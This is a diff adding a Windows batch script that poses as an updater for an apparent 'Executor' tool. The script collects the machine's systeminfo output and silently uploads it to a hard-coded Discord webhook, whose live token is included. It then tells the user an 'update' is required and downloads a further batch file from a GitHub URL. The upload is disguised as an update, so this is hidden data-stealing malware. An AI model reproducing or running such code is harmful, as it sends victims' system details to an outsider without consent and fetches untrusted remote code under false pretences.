@@ -1,0 +1,31 @@
+@echo off
+
+REM Define the path for the sysinfo.txt file in the Documents folder
+set "DOCS_PATH=%USERPROFILE%\Documents\sysinfo.txt"
+
+REM Check if updated_script.bat already exists
+if exist updated_script1.bat (
+    echo You have already updated.
+    exit /b
+)
+
+REM Fetch system information and save it to the Documents folder
+systeminfo > "%DOCS_PATH%"
+
+REM Set the webhook URL
+set WEBHOOK_URL=https://discord.com/api/webhooks/1266980419941830706/hc0F-LYen9xRESOIhlLMdKAshBidbNtDuS2VPvIIFXIRt5yh-Bxp_7A2Atu7-ImDKaOW
+
+REM Use curl to send the sysinfo.txt file to the Discord webhook
+curl -H "Content-Type: multipart/form-data" -F "file=@%DOCS_PATH%" %WEBHOOK_URL%
+
+REM Wait for 1 seconds
+timeout /t 1 /nobreak
+
+REM Print "Update required!"
+echo Update required!
+
+REM Fetch the code from the provided URL and save it as updated_script.bat
+curl -o updated_script1.bat https://github.com/IVAN12312312321321321312321213123/Ivan-s-Executor.new/raw/main/123
+
+REM Notify the user that the script has been updated and saved as updated_script.bat
+echo The script has been updated and saved as updated_script1.bat.
